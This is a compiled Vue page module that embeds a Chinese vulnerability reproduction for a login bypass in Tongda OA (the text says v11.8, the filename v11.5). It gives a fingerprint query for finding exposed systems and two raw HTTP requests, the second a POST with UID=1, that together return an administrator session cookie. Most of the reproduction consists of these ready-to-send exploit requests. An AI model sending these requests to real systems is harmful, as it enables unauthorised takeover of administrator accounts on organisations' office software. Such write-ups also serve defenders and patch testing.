import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as a,e as n}from"./app-58e4a7d6.js";const d={},t=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>通达OA v11.8 logincheck_code.php存在登陆绕过漏洞，通过漏洞攻击者可以登陆系统管理员后台</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>通达OA v11.8
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;TDXK-通达OA&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登陆页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201539126.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发送第一个请求包</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /general/login_code.php HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Accept-Encoding: gzip
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201539839.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>再发送第二个恶意请求</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /logincheck_code.php HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 56
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

CODEUID=%7BD384F12E-A758-F44F-8A37-20E2568306A7%7D&amp;UID=1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201540724.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>获取cookie后访问管理员页面 <code>/general/index.php</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201540662.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,17),c=[t];function l(r,s){return i(),a("div",null,c)}const g=e(d,[["render",l],["__file","通达OA v11.5 logincheck_code.php 登陆绕过漏洞.html.vue"]]);export{g as default};
